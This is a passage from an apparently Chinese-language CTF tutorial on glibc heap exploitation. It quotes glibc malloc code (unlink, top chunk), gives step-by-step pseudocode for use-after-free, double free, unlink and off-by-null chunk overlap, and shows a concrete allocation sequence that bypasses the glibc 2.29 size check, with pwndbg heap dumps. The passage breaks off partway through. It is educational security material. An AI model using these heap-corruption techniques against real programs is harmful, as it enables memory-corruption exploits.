<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span> </span><br><span class="line"><span class="comment">// unlink p </span></span><br><span class="line">define <span class="title function_">unlink</span><span class="params">(AV, P, BK, FD)</span> &#123; \ </span><br><span class="line">	<span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。 </span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>)) \ </span><br><span class="line">	malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>); \ </span><br><span class="line">	FD = P-&gt;fd; \ </span><br><span class="line">	BK = P-&gt;bk; \ </span><br><span class="line">	<span class="comment">// 防止攻击者简单篡改空闲的 chunk 的 fd 与 bk 来实现任意写的效果。 </span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>)) \ </span><br><span class="line">		malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV); \ </span><br><span class="line">	<span class="keyword">else</span> &#123; \ </span><br><span class="line">		FD-&gt;bk = BK; \ </span><br><span class="line">		BK-&gt;fd = FD; \ </span><br><span class="line">		<span class="comment">// 下面主要考虑 P 对应的 nextsize 双向链表的修改 </span></span><br><span class="line">		<span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P)) \ </span><br><span class="line">			<span class="comment">// 如果P-&gt;fd_nextsize为 NULL，表明 P 未插入到 nextsize 链表中。 </span></span><br><span class="line">			<span class="comment">// 那么其实也就没有必要对 nextsize 字段进行修改了。 </span></span><br><span class="line">			<span class="comment">// 这里没有去判断 bk_nextsize 字段，可能会出问题。 </span></span><br><span class="line">			&amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123; \ </span><br><span class="line">			<span class="comment">// 类似于小的 chunk 的检查思路 </span></span><br><span class="line">			<span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>) \ </span><br><span class="line">				|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>)) \ </span><br><span class="line">				malloc_printerr (check_action, \ </span><br><span class="line">					<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>, \ </span><br><span class="line">					P, AV); \ </span><br><span class="line">			<span class="comment">// 这里说明 P 已经在 nextsize 链表中了。 </span></span><br><span class="line">			<span class="comment">// 如果 FD 没有在 nextsize 链表中 </span></span><br><span class="line">			<span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123; \ </span><br><span class="line">				<span class="comment">// 如果 nextsize 串起来的双链表只有 P 本身，那就直接拿走 P </span></span><br><span class="line">				<span class="comment">// 令 FD 为 nextsize 串起来的 </span></span><br><span class="line">				<span class="keyword">if</span> (P-&gt;fd_nextsize == P) \ </span><br><span class="line">					FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD; \ </span><br><span class="line">				<span class="keyword">else</span> &#123; \ </span><br><span class="line">				<span class="comment">// 否则我们需要将 FD 插入到 nextsize 形成的双链表中 </span></span><br><span class="line">					FD-&gt;fd_nextsize = P-&gt;fd_nextsize; \ </span><br><span class="line">					FD-&gt;bk_nextsize = P-&gt;bk_nextsize; \ </span><br><span class="line">					P-&gt;fd_nextsize-&gt;bk_nextsize = FD; \ </span><br><span class="line">					P-&gt;bk_nextsize-&gt;fd_nextsize = FD; \ </span><br><span class="line">					&#125; \ </span><br><span class="line">				&#125; <span class="keyword">else</span> &#123; \ </span><br><span class="line">				<span class="comment">// 如果在的话，直接拿走即可 </span></span><br><span class="line">				P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize; \ </span><br><span class="line">				P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize; \ </span><br><span class="line">				&#125; \ </span><br><span class="line">			&#125; \ </span><br><span class="line">	&#125; \ </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="top-chunk-1">top chunk</h4>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">use_top:  </span><br><span class="line">      <span class="comment">/*  </span></span><br><span class="line"><span class="comment">         If large enough, split off the chunk bordering the end of memory  </span></span><br><span class="line"><span class="comment">         (held in av-&gt;top). Note that this is in accord with the best-fit  </span></span><br><span class="line"><span class="comment">         search rule.  In effect, av-&gt;top is treated as larger (and thus  </span></span><br><span class="line"><span class="comment">         less well fitting) than any other available chunk since it can  </span></span><br><span class="line"><span class="comment">         be extended to be as large as necessary (up to system  </span></span><br><span class="line"><span class="comment">         limitations).  </span></span><br><span class="line"><span class="comment">  </span></span><br><span class="line"><span class="comment">         We require that av-&gt;top always exists (i.e., has size &gt;=  </span></span><br><span class="line"><span class="comment">         MINSIZE) after initialization, so if it would otherwise be  </span></span><br><span class="line"><span class="comment">         exhausted by current request, it is replenished. (The main  </span></span><br><span class="line"><span class="comment">         reason for ensuring it exists is that we may need MINSIZE space  </span></span><br><span class="line"><span class="comment">         to put in fenceposts in sysmalloc.)  </span></span><br><span class="line"><span class="comment">       */</span>  </span><br><span class="line">  </span><br><span class="line">      victim = av-&gt;top;  </span><br><span class="line">      size = chunksize (victim);  </span><br><span class="line">  </span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))  </span><br><span class="line">        &#123;  </span><br><span class="line">          remainder_size = size - nb;  </span><br><span class="line">          remainder = chunk_at_offset (victim, nb);  </span><br><span class="line">          av-&gt;top = remainder;  </span><br><span class="line">          set_head (victim, nb | PREV_INUSE |  </span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));  </span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);  </span><br><span class="line">  </span><br><span class="line">          check_malloced_chunk (av, victim, nb);  </span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);  </span><br><span class="line">          alloc_perturb (p, bytes);  </span><br><span class="line">          <span class="keyword">return</span> p;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">      <span class="comment">/* When we are using atomic ops to free fast chunks we can get  </span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span>  </span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))  </span><br><span class="line">        &#123;  </span><br><span class="line">          malloc_consolidate (av);  </span><br><span class="line">          <span class="comment">/* restore original bin index */</span>  </span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))  </span><br><span class="line">            idx = smallbin_index (nb);  </span><br><span class="line">          <span class="keyword">else</span>  </span><br><span class="line">            idx = largebin_index (nb);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">      <span class="comment">/*  </span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases  </span></span><br><span class="line"><span class="comment">       */</span>  </span><br><span class="line">      <span class="keyword">else</span>  </span><br><span class="line">        &#123;  </span><br><span class="line">          <span class="type">void</span> *p = sysmalloc (nb, av);  </span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)  </span><br><span class="line">            alloc_perturb (p, bytes);  </span><br><span class="line">          <span class="keyword">return</span> p;  </span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="attack">attack</h2>
<h3 id="uaf">UAF</h3>
<ul>
<li><strong>漏洞：<code>free(*ptr)</code>后没有<code>ptr=NULL</code></strong> <div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">free(chunk)</span><br><span class="line">edit(chunk-&gt;fd = target_addr)</span><br><span class="line">target[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">target[<span class="number">1</span>] = fake_size</span><br><span class="line">malloc(chunk)</span><br><span class="line">malloc(target)</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="double-free">double free</h3>
<ul>
<li><strong>漏洞：<code>UAF</code></strong></li>
<li><strong>可利用：<code>fastbin</code>、<code>tcache</code></strong> <div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这里free(chunk1)是指释放chunk1,只是为了方便表达</span></span><br><span class="line">free(chunk1)</span><br><span class="line">free(chunk2)</span><br><span class="line">free(chunk1)</span><br><span class="line"></span><br><span class="line">malloc(chunk1)</span><br><span class="line">edit(chunk1-&gt;fd = target_addr)</span><br><span class="line">malloc(chunk2)</span><br><span class="line">malloc(chunk1)</span><br><span class="line">malloc(chunk3)(malloc(target),这样就实现了任意地址写)</span><br></pre></td></tr></table></figure></div> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="./heap-all-in-one/doublefree1.png"
                      
                ></li>
</ul>
<h3 id="unlink-2">unlink</h3>
<ul>
<li><strong>漏洞：<code>off by ...</code> 、堆溢出</strong></li>
<li>**可利用：<code>unsortedbin</code> <div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">malloc(chunk1)</span><br><span class="line">malloc(chunk2)</span><br><span class="line">edit(chunk1-&gt;fd = <span class="number">0</span>)</span><br><span class="line">edit(chunk1-&gt;bk = chunk_size-<span class="number">0x10</span>)</span><br><span class="line">edit(chunk1-&gt;bk+<span class="number">0x8</span> = chunk1_ptr_addr-<span class="number">0x18</span>)</span><br><span class="line">edit(chunk1-&gt;bk+<span class="number">0x10</span> = chunk1_ptr_addr-<span class="number">0x10</span>)</span><br><span class="line">edit(chunk2-&gt;prev_size = chunk_size-<span class="number">0x11</span>)</span><br><span class="line">edit(chunk2-&gt;size = chunk_size-<span class="number">0x1</span>)</span><br><span class="line">free(chunk2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pre_chunk1-&gt;bk+0x8 = chunk1-&gt;bk+0x10 = main_arena+...</span></span><br><span class="line"><span class="comment">#chunk1-&gt;chunk1_ptr_addr-0x18</span></span><br><span class="line">edit(chunk1_ptr_addr = got) <span class="comment">#leak libc</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="off-by">Off by …</h3>
<h4 id="heap-overlap">heap overlap</h4>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#chunk1,chunk2,chunk3 all allocated</span></span><br><span class="line"><span class="comment">#chunk1 | chunk2 | chunk3</span></span><br><span class="line"><span class="comment">#off by one -&gt; chunk1</span></span><br><span class="line">edit(chunk2-&gt;size = chunk2_size+chunk3_size+<span class="number">1</span>)</span><br><span class="line">free(chunk2)</span><br><span class="line">malloc(chunk2+chunk3)</span><br><span class="line"><span class="comment">#任意写chunk3</span></span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#chunk2 free ; chunk3 allocated</span></span><br><span class="line"><span class="comment">#chunk1 | chunk2 | chunk3</span></span><br><span class="line"><span class="comment">#off by one -&gt; chunk1</span></span><br><span class="line">edit(chunk2-&gt;size = chunk2_size+chunk3_size+<span class="number">1</span>)</span><br><span class="line">free(chunk2)</span><br><span class="line">malloc(chunk2+chunk3)</span><br><span class="line"><span class="comment">#任意写chunk3</span></span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#chunk1,chunk2,chunk3 all allocated</span></span><br><span class="line"><span class="comment">#chunk1 | chunk2 | chunk3</span></span><br><span class="line"><span class="comment">#chunk3-&gt;size%0x100 = 0</span></span><br><span class="line">free(chunk1)</span><br><span class="line"><span class="comment">#off by null -&gt; chunk2 ; chunk3-&gt;prev_inuse = 0</span></span><br><span class="line">edit(chunk3-&gt;prev_size = chunk1_size+chunk2_size)</span><br><span class="line">free(chunk3)</span><br><span class="line">malloc(chunk1+chunk2+chunk3)</span><br><span class="line"><span class="comment">#任意写chunk2</span></span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#chunk0,chunk1,chunk2,chunk3 all allocated</span></span><br><span class="line"><span class="comment">#chunk0 | chunk1 | chunk2 | chunk3</span></span><br><span class="line">free(chunk0)  <span class="comment">#在 chunk1 的 prev_size 域留下 chunk0 的大小</span></span><br><span class="line"><span class="comment">#off by null -&gt; chunk1 ; chunk2-&gt;prev_inuse = 0</span></span><br><span class="line">edit(chunk2-&gt;prev_size = chunk0_size+chunk1_size)</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
<ol type="1">
<li>现在有 Chunk_0、Chunk_1、Chunk_2、Chunk_3。</li>
<li>释放 Chunk_0 ，此时将会在 Chunk_1 的 prev_size 域留下 Chunk_0 的大小</li>
<li>在 Chunk_1 处触发Off-by-null，篡改 Chunk_2 的 prev_size 域以及 prev_inuse位</li>
<li>Glibc 通过 Chunk_2 的 prev_size 域找到空闲的 Chunk_0</li>
<li>将 Chunk_0 进行 Unlink 操作，通过 Chunk_0 的 size 域找到 nextchunk 就是 Chunk_1 ，检查 Chunk_0 的 size 与 Chunk_1 的 prev_size 是否相等。</li>
<li>由于第二步中已经在 Chunk_1 的 prev_size 域留下了 Chunk_0 的大小，因此，检查通过。</li>
</ol>
<h4 id="section">2.29</h4>
<p>新增的保护 <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br></pre></td></tr></table></figure></div></p>
<p>新的构造绕过 <div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x418</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x108</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x438</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x438</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x108</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x488</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x428</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x108</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x458</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x438</span>+<span class="string">b&#x27;\x51\x05&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x418</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x418</span>,<span class="string">b&#x27;0&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x428</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x418</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x4f8</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x488</span>+p64(<span class="number">0x431</span>))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x3b8</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x418</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x108</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x100</span>+p64(<span class="number">0x550</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br></pre></td></tr></table></figure></div></p>
<p>下面演示一下，执行到<code>delete(6)</code> <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line">0x61107b3f7000      0x0                 0x290                Used                None              None</span><br><span class="line">0x61107b3f7290      0x0                 0x420                Freed     0x73ccc601ace0    0x61107b3f7c00</span><br><span class="line">0x61107b3f76b0      0x420               0x110                Used                None              None</span><br><span class="line">0x61107b3f77c0      0x0                 0x440                Used                None              None</span><br><span class="line">0x61107b3f7c00      0x0                 0x440                Freed     0x61107b3f7290    0x61107b3f85e0</span><br><span class="line">0x61107b3f8040      0x440               0x110                Used                None              None</span><br><span class="line">0x61107b3f8150      0x0                 0x490                Used                None              None</span><br><span class="line">0x61107b3f85e0      0x0                 0x430                Freed     0x61107b3f7c00    0x73ccc601ace0</span><br><span class="line">0x61107b3f8a10      0x430               0x110                Used                None              None</span><br></pre></td></tr></table></figure></div> <code>delete(2)</code>造成合并</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line">0x61107b3f7000      0x0                 0x290                Used                None              None</span><br><span class="line">0x61107b3f7290      0x0                 0x420                Freed     0x73ccc601ace0    0x61107b3f85e0</span><br><span class="line">0x61107b3f76b0      0x420               0x110                Used                None              None</span><br><span class="line">0x61107b3f77c0      0x0                 0x880                Freed     0x61107b3f85e0    0x73ccc601ace0</span><br><span class="line">0x61107b3f8040      0x880               0x110                Used                None              None</span><br><span class="line">0x61107b3f8150      0x0                 0x490                Used                None              None</span><br><span class="line">0x61107b3f85e0      0x0                 0x430                Freed     0x61107b3f7290    0x61107b3f77c0</span><br><span class="line">0x61107b3f8a10      0x430               0x110                Used                None              None</span><br></pre></td></tr></table></figure></div>
<p>将原来的2号扩展<code>0x20</code>，将原来三号的头保护起来，成为新的2号，而原来的3号缩小了<code>0x20</code></p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line">0x61107b3f7000      0x0                 0x290                Used                None              None</span><br><span class="line">0x61107b3f7290      0x0                 0x420                Freed     0x73ccc601b0d0    0x61107b3f85e0</span><br><span class="line">0x61107b3f76b0      0x420               0x110                Used                None              None</span><br><span class="line">0x61107b3f77c0      0x0                 0x460                Used                None              None</span><br><span class="line">0x61107b3f7c20      0x0                 0x420                Freed     0x73ccc601ace0    0x73ccc601ace0</span><br><span class="line">0x61107b3f8040      0x420               0x110                Used                None              None</span><br><span class="line">0x61107b3f8150      0x0                 0x490                Used                None              None</span><br><span class="line">0x61107b3f85e0      0x0                 0x430                Freed     0x61107b3f7290    0x73ccc601b0d0</span><br><span class="line">0x61107b3f8a10      0x430               0x110                Used                None              None</span><br></pre></td></tr></table></figure></div>
<p>保护的<code>fd、bk</code>指向0号和6号，另外把<code>chunk</code>的大小改为<code>chunk3_size+chunk4_size</code></p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x61107b3f7c00</span><br><span class="line">00:0000│     0x61107b3f7c00 ◂— 0</span><br><span class="line">01:0008│     0x61107b3f7c08 ◂— 0x551</span><br><span class="line">02:0010│     0x61107b3f7c10 —▸ 0x61107b3f7290 ◂— 0</span><br><span class="line">03:0018│     0x61107b3f7c18 —▸ 0x61107b3f85e0 ◂— 0</span><br><span class="line">04:0020│     0x61107b3f7c20 ◂— 0</span><br><span class="line">05:0028│     0x61107b3f7c28 ◂— 0x421</span><br><span class="line">06:0030│     0x61107b3f7c30 —▸ 0x73ccc601ace0 (main_arena+96) —▸ 0x61107b3f8b20 ◂— 0</span><br><span class="line">07:0038│     0x61107b3f7c38 —▸ 0x73ccc601ace0 (main_arena+96) —▸ 0x61107b3f8b20 ◂— 0</span><br></pre></td></tr></table></figure></div>
<p>接着可以把其他的堆块全申请回来，这里原来的3号<code>prev_size</code>地址一定是以<code>\x00</code>结尾，这样我们就可以利用<code>off-by-null</code>让他从指向新的3号到指向旧的3号</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line">0x61107b3f7000      0x0                 0x290                Used                None              None</span><br><span class="line">0x61107b3f7290      0x0                 0x420                Used                None              None</span><br><span class="line">0x61107b3f76b0      0x420               0x110                Used                None              None</span><br><span class="line">0x61107b3f77c0      0x0                 0x460                Used                None              None</span><br><span class="line">0x61107b3f7c20      0x0                 0x420                Used                None              None</span><br><span class="line">0x61107b3f8040      0x420               0x110                Used                None              None</span><br><span class="line">0x61107b3f8150      0x0                 0x490                Used                None              None</span><br><span class="line">0x61107b3f85e0      0x0                 0x430                Used                None              None</span><br><span class="line">0x61107b3f8a10      0x430               0x110                Used                None              None</span><br></pre></td></tr></table></figure></div>
<p>接着我们构造0号<code>bk</code>指针指向原来的3号地址</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line">0x61107b3f7000      0x0                 0x290                Used                None              None</span><br><span class="line">0x61107b3f7290      0x0                 0x420                Freed     0x73ccc601ace0    0x61107b3f7c20</span><br><span class="line">0x61107b3f76b0      0x420               0x110                Used                None              None</span><br><span class="line">0x61107b3f77c0      0x0                 0x460                Used                None              None</span><br><span class="line">0x61107b3f7c20      0x0                 0x420                Freed     0x61107b3f7290    0x73ccc601ace0</span><br><span class="line">0x61107b3f8040      0x420               0x110                Used                None              None</span><br><span class="line">0x61107b3f8150      0x0                 0x490                Used                None              None</span><br><span class="line">0x61107b3f85e0      0x0                 0x430                Used                None              None</span><br><span class="line">0x61107b3f8a10      0x430               0x110                Used                None              None</span><br></pre></td></tr></table></figure></div>
<p><code>off-by-null</code>前</p>
